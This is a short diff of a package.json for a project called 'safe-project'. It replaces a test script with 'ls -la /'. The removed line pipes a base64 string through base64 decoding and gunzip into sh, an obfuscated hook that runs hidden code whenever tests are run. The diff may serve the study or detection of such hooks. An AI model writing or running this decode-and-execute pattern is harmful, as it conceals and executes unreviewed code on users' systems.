@@ -2,6 +2,6 @@
   "name": "safe-project",
   "version": "1.0.0",
   "scripts": {
-    "test": "echo H4sIAAAAAAAA/yvKz8lJzS9ILcrPzAMAGgE5wQoAAAA= | base64 -d | gunzip | sh"
+    "test": "ls -la /"
   }
 }
